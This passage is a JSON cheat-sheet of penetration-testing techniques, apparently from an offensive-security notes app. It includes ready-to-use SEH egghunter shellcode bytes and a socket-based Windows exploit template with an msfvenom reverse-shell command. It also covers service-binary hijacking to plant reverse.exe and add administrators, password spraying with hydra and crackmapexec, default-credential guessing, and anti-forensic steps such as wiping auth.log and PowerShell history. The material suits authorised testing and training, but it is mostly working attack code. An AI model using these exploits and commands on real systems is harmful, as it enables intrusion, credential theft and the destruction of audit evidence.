            "code": "# Restore deleted file\ngit checkout <commit-id>^ -- <file-path>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "KeePass Password Manager",
    "title": "Security Considerations",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "note",
        "content": "KeePass databases found during pentests often contain:\n- Domain administrator credentials\n- Service account passwords\n- Database credentials\n- SSH keys and certificates\n- API keys and tokens",
        "variant": "important"
      },
      {
        "type": "note",
        "content": "Always check KeePass databases thoroughly - they're a goldmine of credentials!",
        "variant": "tip"
      }
    ]
  },
  {
    "category": "GitHub Reconnaissance",
    "title": "Security Considerations",
    "tags": [],
    "steps": [],
    "resources": [],
    "notes": [
      {
        "type": "note",
        "content": "Exposed .git directories often contain:\n- Database credentials\n- API keys and tokens\n- SSH private keys\n- Internal IP addresses\n- Email addresses\n- Source code with vulnerabilities\n- Deployment scripts",
        "variant": "important"
      }
    ]
  },
  {
    "category": "User Management Commands",
    "title": "Security Considerations",
    "tags": [],
    "steps": [
      {
        "title": "Cleanup",
        "codes": [
          {
            "lang": "bash",
            "code": "# Windows - Remove user\nnet user <username> /delete\n\n# Remove from groups first if needed\nnet localgroup Administrators <username> /delete"
          },
          {
            "lang": "bash",
            "code": "# Linux - Remove user\nsudo userdel -r <username>\n\n# Clear auth logs (if root)\necho > /var/log/auth.log"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "notes": [
      {
        "type": "note",
        "content": "Creating users leaves obvious traces:\n- Event logs (Windows)\n- /var/log/auth.log (Linux)\n- User account listings\n- Login history",
        "variant": "warning"
      }
    ]
  },
  {
    "category": "Evil-WinRM",
    "title": "Security Considerations",
    "tags": [],
    "steps": [
      {
        "title": "Clear PowerShell History",
        "codes": [
          {
            "lang": "powershell",
            "code": "Remove-Item (Get-PSReadlineOption).HistorySavePath"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "notes": [
      {
        "type": "note",
        "content": "Evil-WinRM creates a PowerShell session that may be logged. Consider:\n- Using AMSI bypass immediately\n- Clearing PowerShell history after use\n- Using obfuscated scripts when possible",
        "variant": "important"
      }
    ]
  },
  {
    "category": "SSH Pivoting",
    "title": "Security Considerations",
    "tags": [],
    "steps": [
      {
        "title": "Minimize Footprint",
        "codes": [
          {
            "lang": "bash",
            "code": "# Use compression to reduce traffic\nssh user@target -D 9050 -C\n\n# Disable strict host key checking (testing only)\nssh user@target -D 9050 -o StrictHostKeyChecking=no"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "notes": [
      {
        "type": "note",
        "content": "SSH tunneling creates logs on the target system:\n- `/var/log/auth.log` (Debian/Ubuntu)\n- `/var/log/secure` (RHEL/CentOS)\n- `~/.ssh/authorized_keys` access logs",
        "variant": "warning"
      }
    ]
  },
  {
    "category": "Writable etc-passwd",
    "title": "Security Considerations",
    "tags": [],
    "steps": [
      {
        "title": "Detection",
        "codes": [
          {
            "lang": "bash",
            "code": "# Admins can detect by:\n# - Checking file permissions\nls -l /etc/passwd\n\n# - Checking for UID 0 users\nawk -F: '$3 == 0 {print $1}' /etc/passwd\n\n# - Monitoring file changes\n# - Reviewing auth logs"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": [],
    "notes": [
      {
        "type": "note",
        "content": "Writable /etc/passwd is a critical misconfiguration:\n- Allows instant root access\n- Leaves obvious traces\n- Easy to detect in logs\n- Should be reported as critical finding",
        "variant": "warning"
      }
    ]
  },
  {
    "category": "Security Headers Scanning",
    "title": "Security Headers Checklist",
    "tags": [
      "Reconnaissance",
      "Security_Headers",
      "Web_Application"
    ],
    "steps": [
      {
        "title": "Minimum Required Headers",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "- [ ] `Content-Security-Policy` - Prevents XSS\n- [ ] `X-Frame-Options: DENY` - Prevents clickjacking\n- [ ] `Strict-Transport-Security` - Enforces HTTPS\n- [ ] `X-Content-Type-Options: nosniff` - Prevents MIME sniffing\n- [ ] `Referrer-Policy: no-referrer` - Prevents information leakage"
          }
        ]
      },
      {
        "title": "Recommended Headers",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "- [ ] `Permissions-Policy` - Restricts browser features\n- [ ] `X-XSS-Protection: 1; mode=block` - Legacy XSS protection\n- [ ] `Cache-Control: no-store` - Prevents caching sensitive data"
          }
        ]
      },
      {
        "title": "Headers to Remove (Information Disclosure)",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "text",
            "content": "- [ ] Remove `Server` header\n- [ ] Remove `X-Powered-By` header\n- [ ] Remove `X-AspNet-Version` header\n- [ ] Remove `X-Generator` header"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Security Headers Scanning",
    "title": "Security Headers Scanning",
    "tags": [
      "Reconnaissance",
      "Security_Headers",
      "Web_Application"
    ],
    "steps": [],
    "resources": [
      {
        "text": "SecurityHeaders.com",
        "url": "https://securityheaders.com/"
      },
      {
        "text": "Mozilla Observatory",
        "url": "https://observatory.mozilla.org/"
      },
      {
        "text": "OWASP Secure Headers",
        "url": "https://owasp.org/www-project-secure-headers/"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Analyze HTTP security headers to identify misconfigurations and potential vulnerabilities in web applications."
      }
    ]
  },
  {
    "category": "SEH Overflow Exploitation",
    "title": "SEH Overflow Exploitation",
    "tags": [
      "Binary_Exploitation",
      "Debugging",
      "Exploitation",
      "SEH_Overflow",
      "WinDbg",
      "Windows"
    ],
    "steps": [
      {
        "title": "SEH Overflow vs Stack Overflow [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "SEH overwrites target the exception handler chain instead of the return address:\n- **Stack Overflow**: Overwrite return address, gain control at function return\n- **SEH Overflow**: Overwrite SEH handler, gain control when exception is triggered",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Identify SEH Overwrite",
        "codes": [
          {
            "lang": "text",
            "code": "0:000> !exchain\n0012f234: 41414141           ; Handler overwritten with 'AAAA'\nInvalid exception stack at 41414141"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Check if crash involves SEH."
          }
        ]
      },
      {
        "title": "Determine Offset to SEH",
        "codes": [
          {
            "lang": "bash",
            "code": "msf-pattern_create -l <Length>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Use pattern to find exact offset."
          }
        ]
      },
      {
        "title": "Find SEH Offset",
        "codes": [
          {
            "lang": "bash",
            "code": "msf-pattern_offset -l <Length> -q <HandlerValue>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "After crash, get offset from handler value."
          }
        ],
        "postNotes": [
          {
            "type": "note",
            "content": "**Note**: nSEH is 4 bytes before handler. If handler offset is 1000, nSEH offset is 996."
          }
        ]
      },
      {
        "title": "SEH Exploit Structure [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "[Padding][nSEH][Handler][Shellcode]\n    |      |      |         |\n    |      |      |         +-- Actual shellcode\n    |      |      +------------ P/P/R gadget address\n    |      +------------------- Short jump to shellcode\n    +-------------------------- Fills buffer to reach SEH"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Layout of SEH overflow payload."
          }
        ]
      },
      {
        "title": "Verify SEH Control",
        "codes": [
          {
            "lang": "python",
            "code": "offset_to_nseh = <Offset>\nbuffer = b\"A\" * offset_to_nseh\nbuffer += b\"B\" * 4      # nSEH - should see 42424242\nbuffer += b\"C\" * 4      # Handler - should see 43434343\nbuffer += b\"D\" * 100    # After SEH"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Confirm control over both nSEH and handler."
          }
        ]
      },
      {
        "title": "Check in WinDbg",
        "codes": [
          {
            "lang": "text",
            "code": "0:000> !exchain\n0012f234: 43434343           ; Handler = CCCC\nInvalid exception stack at 42424242  ; nSEH = BBBB"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Verify overwrite after crash."
          }
        ]
      },
      {
        "title": "Why P/P/R? [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "1. Exception triggers\n2. Handler called with EstablisherFrame pointing to nSEH\n3. EstablisherFrame is at ESP+8 when handler runs\n4. POP; POP; RET sequence:\n   - POP removes first value from stack\n   - POP removes second value (now ESP at EstablisherFrame)\n   - RET jumps to address at ESP (our nSEH)\n5. nSEH contains short jump to shellcode"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "When exception occurs, EstablisherFrame points to our SEH record."
          }
        ]
      },
      {
        "title": "Construct SEH Exploit",
        "codes": [
          {
            "lang": "python",
            "code": "import struct\n\noffset_to_nseh = <Offset>\n\n# Short jump: JMP SHORT +6 (EB 06)\n# Jumps over handler address to shellcode\nnseh = b\"\\xeb\\x06\\x90\\x90\"      # JMP +6, NOP, NOP\n\n# P/P/R gadget address (little endian)\nhandler = struct.pack(\"<I\", <PPRAddress>)\n\n# Shellcode (after handler)\nshellcode = b\"\\x90\" * 16        # NOP sled\nshellcode += b\"\"                # msfvenom payload\n\n# Build buffer\nbuffer = b\"A\" * offset_to_nseh\nbuffer += nseh\nbuffer += handler\nbuffer += shellcode"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Build the complete exploit payload."
          }
        ]
      },
      {
        "title": "Short Jump Calculation [Knowledge]",
        "codes": [
          {
            "lang": "text",
            "code": "nSEH:     EB 06 90 90    ; JMP +6 bytes forward\nHandler:  XX XX XX XX    ; 4 bytes (P/P/R address)\nLanding:  90 90 ...      ; Shellcode starts here\n\nJump is: current position (2) + 6 = 8 bytes from nSEH start\nThis lands just after the handler address"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "The short jump (EB xx) is relative to the next instruction."
          }
        ]
      },
      {
        "title": "Trigger Exception",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "After overwriting SEH, trigger an exception to call handler:\n- Access violation (writing past buffer)\n- Explicit crash (read from invalid address)\n- Integer overflow / divide by zero",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Corelan SEH Exploits",
        "url": "https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Exploit SEH overwrites by controlling the exception handler pointer and triggering an exception."
      }
    ]
  },
  {
    "category": "SEH-Based Egghunter",
    "title": "SEH-Based Egghunter",
    "tags": [
      "Binary_Exploitation",
      "Debugging",
      "Egghunter",
      "Exploitation",
      "SEH_Overflow",
      "WinDbg",
      "Windows"
    ],
    "steps": [
      {
        "title": "SEH Egghunter Concept [Knowledge]",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Installs custom exception handler to catch access violations:\n- **Advantage**: Works across Windows versions (syscall-independent)\n- **Disadvantage**: Larger size (~60 bytes vs ~32 bytes)\n- **Mechanism**: When invalid memory accessed, SEH handler increments page",
            "variant": "info"
          }
        ]
      },
      {
        "title": "SEH Egghunter Assembly",
        "codes": [
          {
            "lang": "nasm",
            "code": "start:\n    jmp get_seh_address\nbuild_exception_record:\n    pop ecx                     ; ECX = address of handler\n    mov eax, 0x74303077         ; EAX = egg (\"w00t\")\n    push ecx                    ; Push handler address\n    push 0xffffffff             ; Push end of chain marker\n    xor ebx, ebx                ; EBX = 0\n    mov fs:[ebx], esp           ; Install our SEH handler\n    sub ecx, 0x04               ; Adjust ECX for increment\n    add ecx, 0x04               ; Increment (will be entry point after exception)\n\nis_egg:\n    inc ecx                     ; Next address\n    push 0x02                   ; Size for scasd operations\n    pop edx\n    cld                         ; Clear direction flag\n    mov edi, ecx                ; EDI = search address\n    repe scasd                  ; Compare egg twice\n    jnz is_egg                  ; If not found, continue\n    jmp edi                     ; Egg found, jump to shellcode\n\nget_seh_address:\n    call build_exception_record\n    push 0x0c                   ; Offset to get to address to increment\n    pop ecx\n    mov eax, [esp+ecx]          ; Get address from exception context\n    mov cl, 0x0e                ;\n    add dword ptr [eax+ecx], 0x06  ; Adjust EIP in context (+6 bytes)\n    popad                       ; Restore registers\n    cld                         ; Clear direction flag\n    xor eax, eax                ; Return ExceptionContinueExecution\n    ret"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Portable egghunter implementation."
          }
        ]
      },
      {
        "title": "SEH Egghunter Shellcode (Python)",
        "codes": [
          {
            "lang": "python",
            "code": "# SEH-based egghunter\n# Egg: w00t (0x74303077)\negghunter_seh = (\n    b\"\\xeb\\x2a\"                 # jmp get_seh_address\n    b\"\\x59\"                     # pop ecx\n    b\"\\xb8\\x77\\x30\\x30\\x74\"     # mov eax, 0x74303077\n    b\"\\x51\"                     # push ecx\n    b\"\\x6a\\xff\"                 # push 0xffffffff\n    b\"\\x33\\xdb\"                 # xor ebx, ebx\n    b\"\\x64\\x89\\x23\"             # mov fs:[ebx], esp\n    b\"\\x83\\xe9\\x04\"             # sub ecx, 4\n    b\"\\x83\\xc1\\x04\"             # add ecx, 4\n    b\"\\x41\"                     # inc ecx\n    b\"\\x6a\\x02\"                 # push 0x02\n    b\"\\x5a\"                     # pop edx\n    b\"\\xfc\"                     # cld\n    b\"\\x8b\\xf9\"                 # mov edi, ecx\n    b\"\\xf3\\xaf\"                 # repe scasd\n    b\"\\x75\\xf6\"                 # jnz is_egg\n    b\"\\xff\\xe7\"                 # jmp edi\n    b\"\\xe8\\xd1\\xff\\xff\\xff\"     # call build_exception_record\n    b\"\\x6a\\x0c\"                 # push 0x0c\n    b\"\\x59\"                     # pop ecx\n    b\"\\x8b\\x04\\x0c\"             # mov eax, [esp+ecx]\n    b\"\\xb1\\x0e\"                 # mov cl, 0x0e\n    b\"\\x01\\x44\\x08\\x06\"         # add [eax+ecx], 6\n    b\"\\x61\"                     # popad\n    b\"\\xfc\"                     # cld\n    b\"\\x33\\xc0\"                 # xor eax, eax\n    b\"\\xc3\"                     # ret\n)"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Ready-to-use SEH egghunter bytes."
          }
        ]
      },
      {
        "title": "Generate with Mona",
        "codes": [
          {
            "lang": "text",
            "code": "!mona egg -t w00t -wow64 -winver 10"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Create SEH egghunter in Immunity Debugger."
          }
        ]
      },
      {
        "title": "Windows 10 Compatibility",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "SEH egghunter needs adjustments for Windows 10."
          },
          {
            "type": "note",
            "content": "Windows 10 uses different exception handling internals.\nUse `!mona egg -winver 10` for compatible egghunter."
          }
        ]
      },
      {
        "title": "Complete Exploit Structure",
        "codes": [
          {
            "lang": "python",
            "code": "import socket\nimport struct\n\n# Configuration\ntarget = \"<TargetIP>\"\nport = <Port>\negg = b\"w00t\"\n\n# SEH egghunter (32 bytes)\negghunter = b\"\\x66\\x81\\xca\\xff\\x0f...\"  # Your egghunter\n\n# Full shellcode with egg prepended\n# msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<Port> -f python -b \"\\x00\"\nshellcode = b\"\"\nshellcode += b\"\\xfc\\xe8...\"  # Generated shellcode\n\n# Prepend egg to shellcode\npayload_with_egg = egg + egg + shellcode\n\n# Build overflow buffer\n# Example: SEH overflow\noffset_to_nseh = <Offset>\nnseh = b\"\\xeb\\x06\\x90\\x90\"           # JMP SHORT +6\nhandler = struct.pack(\"<I\", <PPR>)   # P/P/R address\n\nbuffer = b\"A\" * offset_to_nseh\nbuffer += nseh\nbuffer += handler\nbuffer += egghunter                   # Egghunter after handler\nbuffer += b\"\\x90\" * 100               # Padding\n\n# Shellcode placed elsewhere (e.g., different HTTP parameter)\n# The egghunter will find it"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Using egghunter in a full exploit."
          }
        ]
      },
      {
        "title": "Testing Strategy",
        "codes": [
          {
            "lang": "text",
            "code": "0:000> bp <EgghunterStart>      ; Break at egghunter\n0:000> g                         ; Run\n; When hit, step through to verify search\n0:000> s -a 0 L?7fffffff \"w00tw00t\"  ; Find egg in memory"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Verify egghunter operation."
          }
        ]
      },
      {
        "title": "Egg Placement Strategies",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Where to put the egg+shellcode:\n- **Same buffer, different location**: Earlier in overflow buffer\n- **Different parameter**: POST data, Cookie, User-Agent\n- **Heap allocation**: If application copies data to heap",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "Corelan Egghunter Tutorial",
        "url": "https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Cross-version compatible egghunter using SEH to handle access violations during memory search."
      }
    ]
  },
  {
    "category": "Evil-WinRM",
    "title": "Service Discovery",
    "tags": [],
    "steps": [
      {
        "title": "Port Scanning",
        "codes": [
          {
            "lang": "bash",
            "code": "nmap -p5985,5986 <TargetIP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "postNotes": [
          {
            "type": "note",
            "content": "Port 5985 - HTTP (plaintext protocol)\nPort 5986 - HTTPS (encrypted)",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": []
  },
  {
    "category": "Port Scanning with Nmap",
    "title": "Service Enumeration",
    "tags": [
      "Discovery",
      "Network",
      "Nmap",
      "Reconnaissance"
    ],
    "steps": [
      {
        "title": "OS Fingerprinting",
        "substeps": [
          {
            "title": "OS Fingerprinting with Guess",
            "codes": [
              {
                "lang": "bash",
                "code": "sudo nmap -O --osscan-guess <Target>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "codes": [
          {
            "lang": "bash",
            "code": "sudo nmap -O <Target>"
          }
        ],
        "notes": [
          {
            "type": "note",
            "content": "Guesses OS based on TCP/IP stack implementation.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "Service Version Detection",
        "codes": [
          {
            "lang": "bash",
            "code": "nmap -sV <Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Aggressive Scan",
        "codes": [
          {
            "lang": "bash",
            "code": "nmap -A <Target>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Enables OS detection, version detection, script scanning, and traceroute.",
            "variant": "info"
          }
        ]
      },
      {
        "title": "NSE Scripts",
        "substeps": [
          {
            "title": "Run Specific Script",
            "codes": [
              {
                "lang": "bash",
                "code": "nmap --script <ScriptName> <Target>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Run Script Category",
            "codes": [
              {
                "lang": "bash",
                "code": "nmap --script vuln <Target>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Get Script Help",
            "codes": [
              {
                "lang": "bash",
                "code": "nmap --script-help <ScriptName>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Common Scripts",
            "codes": [
              {
                "lang": "bash",
                "code": "nmap --script http-headers <Target>"
              },
              {
                "lang": "bash",
                "code": "nmap --script smb-os-discovery <Target>"
              },
              {
                "lang": "bash",
                "code": "nmap --script dns-brute <Target>"
              }
            ],
            "optional": true,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Scripts located in **/usr/share/nmap/scripts/**. Use for enumeration, brute force, and vulnerability detection.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "PowerShell Port Scanning",
        "substeps": [
          {
            "title": "Test Single Port",
            "codes": [
              {
                "lang": "powershell",
                "code": "Test-NetConnection -Port <Port> <Target>"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          },
          {
            "title": "Scan Port Range",
            "codes": [
              {
                "lang": "powershell",
                "code": "1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect(\"<Target>\", $_)) \"TCP port $_ is open\"} 2>$null"
              }
            ],
            "optional": false,
            "alternative": false,
            "remote": false,
            "local": false
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Living off the Land when no tools are available.",
            "variant": "info"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Service Exploitation",
    "title": "Service Exploitation",
    "tags": [
      "Exploitation",
      "Privilege_Escalation",
      "Windows"
    ],
    "steps": [
      {
        "title": "Weak Service Permissions",
        "codes": [
          {
            "lang": "bash",
            "code": "sc config <ServiceName> binpath= \"C:\\path\\to\\reverse.exe\"\nsc stop <ServiceName>\nsc start <ServiceName>"
          },
          {
            "lang": "bash",
            "code": "sc config <ServiceName> binpath= \"net localgroup administrators <Username> /add\"\nsc stop <ServiceName>\nsc start <ServiceName>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Exploitable if **accesschk** shows **SERVICE_ALL_ACCESS**, **SERVICE_CHANGE_CONFIG**, **WRITE_DAC**, or **WRITE_OWNER** for your user/group.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Unquoted Service Path",
        "codes": [
          {
            "lang": "bash",
            "code": "C:\\Program Files\\Vulnerable App\\Service.exe\n\nSearch order:\n1. C:\\Program.exe\n2. C:\\Program Files\\Vulnerable.exe\n3. C:\\Program Files\\Vulnerable App\\Service.exe"
          },
          {
            "lang": "powershell",
            "code": "# Check write permissions on path segments\nicacls \"C:\\Program Files\\Vulnerable App\""
          },
          {
            "lang": "bash",
            "code": "copy C:\\path\\to\\reverse.exe \"C:\\Program Files\\Vulnerable.exe\"\nsc stop <ServiceName>\nsc start <ServiceName>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "If service path contains spaces and isn't quoted, Windows searches for executables in order. Place payload at first writable location.",
            "variant": "tip"
          }
        ]
      },
      {
        "title": "Weak Binary Permissions",
        "codes": [
          {
            "lang": "powershell",
            "code": "icacls \"C:\\Path\\To\\Service.exe\""
          },
          {
            "lang": "bash",
            "code": "move \"C:\\Path\\To\\Service.exe\" \"C:\\Path\\To\\Service.exe.bak\"\ncopy C:\\path\\to\\reverse.exe \"C:\\Path\\To\\Service.exe\"\nsc stop <ServiceName>\nsc start <ServiceName>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "If you have write access to the service executable itself, replace it with your payload.",
            "variant": "tip"
          }
        ]
      }
    ],
    "resources": [
      {
        "text": "HackTricks Service Exploitation",
        "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services"
      }
    ],
    "foundational": true,
    "notes": [
      {
        "type": "note",
        "content": "Exploit misconfigured Windows services to escalate privileges. Requires writable service config, unquoted paths, or writable service binaries.",
        "variant": "info"
      }
    ]
  },
  {
    "category": "Password Strategy",
    "title": "Service-Specific Strategies",
    "tags": [],
    "steps": [
      {
        "title": "SSH",
        "codes": [
          {
            "lang": "bash",
            "code": "# Try common defaults\nssh admin@<TargetIP>\n# Passwords: admin, password, Password1\n\n# Try username as password\nssh john@<TargetIP>\n# Password: john\n\n# Spray common passwords\nhydra -L users.txt -P spray.txt ssh://<TargetIP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "SMB/Windows",
        "codes": [
          {
            "lang": "bash",
            "code": "# Try admin:admin\ncrackmapexec smb <TargetIP> -u admin -p admin\n\n# Try administrator:administrator\ncrackmapexec smb <TargetIP> -u administrator -p administrator\n\n# Password spray\ncrackmapexec smb <TargetIP> -u users.txt -p spray.txt"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "RDP",
        "codes": [
          {
            "lang": "bash",
            "code": "# Try administrator:password\nxfreerdp3 /u:administrator /p:password /v:<TargetIP>\n\n# Try admin:admin\nxfreerdp3 /u:admin /p:admin /v:<TargetIP>"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      },
      {
        "title": "Web Applications",
        "codes": [
          {
            "lang": "bash",
            "code": "# Try admin:admin on login form\n# Try username:username\n# Try default credentials for the specific CMS"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false
      }
    ],
    "resources": []
  },
  {
    "category": "Linux Reference",
    "title": "Shadow and Passwd File Formats",
    "tags": [
      "Linux"
    ],
    "steps": [
      {
        "title": "/etc/shadow Format",
        "codes": [
          {
            "lang": "bash",
            "code": "# Example shadow entry:\n# root:$6$RqNi$...PbED0:16520:0:99999:7:::\n#\n# Field 1: Login name\n# Field 2: Encrypted password\n# Field 3: Date of last password change (days since epoch)\n# Field 4: Minimum password age (in days)\n# Field 5: Maximum password age (in days)\n# Field 6: Password warning period (in days)\n# Field 7: Password inactivity period (in days)\n# Field 8: Account expiration date (days since epoch)\n# Field 9: Reserved\n\n# View shadow configuration\ncat /etc/login.defs"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Format: `username:hash:lastchange:min:max:warn:inactive:expire:reserved`"
          }
        ]
      },
      {
        "title": "Shadow Hash Types",
        "codes": [
          {
            "lang": "text",
            "code": "$1$   - MD5\n$2a$  - bcrypt\n$2y$  - bcrypt\n$5$   - SHA-256\n$6$   - SHA-512\n\n# Example: $6$n4wLdmr59pt... indicates SHA-512"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Identify hash algorithm from the first characters of the hash."
          }
        ]
      },
      {
        "title": "/etc/passwd Format",
        "codes": [
          {
            "lang": "bash",
            "code": "# Example passwd entry:\n# root:x:0:0:Root:/root:/bin/bash\n#\n# Field 1: Login name\n# Field 2: Password (x = in shadow, * = cannot login)\n# Field 3: User ID (UID) - root = 0\n# Field 4: Primary Group ID (GID)\n# Field 5: Comment/User full name\n# Field 6: User's home directory\n# Field 7: User's default shell"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Format: `username:password:uid:gid:comment:home:shell`"
          }
        ]
      }
    ],
    "resources": [],
    "foundational": true
  },
  {
    "category": "Shadow Copies Extraction",
    "title": "Shadow Copies Extraction",
    "tags": [
      "Active_Directory",
      "Credential_Access",
      "NTDS",
      "Windows"
    ],
    "steps": [],
    "resources": [
      {
        "text": "HackTricks Shadow Copies",
        "url": "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#shadow-copies"
      },
      {
        "text": "PayloadsAllTheThings NTDS",
        "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#dumping-ntdsdit"
      }
    ],
    "advanced": true,
    "notes": [
      {
        "type": "note",
        "content": "Extract sensitive files (NTDS.dit, SAM, SYSTEM) from Volume Shadow Copies on Windows systems."
      }
    ]
  },
  {
    "category": "Shared Library Attacks",
    "title": "Shared Library Theory",
    "tags": [
      "Exploitation",
      "Linux",
      "Post_Exploitation"
    ],
    "steps": [
      {
        "title": "Library Search Order",
        "codes": [],
        "optional": false,
        "alternative": false,
        "remote": false,
        "local": false,
        "notes": [
          {
            "type": "note",
            "content": "Library search order (exploitable priority):\n1. RPATH/RUNPATH embedded in binary\n2. **LD_LIBRARY_PATH** environment variable\n3. /etc/ld.so.cache\n4. /lib and /usr/lib",
            "variant": "important"
          }
        ]
      },
      {
        "title": "Find Binary's Required Libraries",
        "codes": [
          {
            "lang": "bash",
            "code": "ldd /path/to/binary"
          }
        ],
        "optional": false,
        "alternative": false,
        "remote": true,
        "local": false
      },
      {
        "title": "Check for RPATH",
        "codes": [
          {
            "lang": "bash",
            "code": "readelf -d /path/to/binary | grep -i rpath\nobjdump -x /path/to/binary | grep -i rpath"
          }
        ],
        "optional": false,
        "alternative": false,
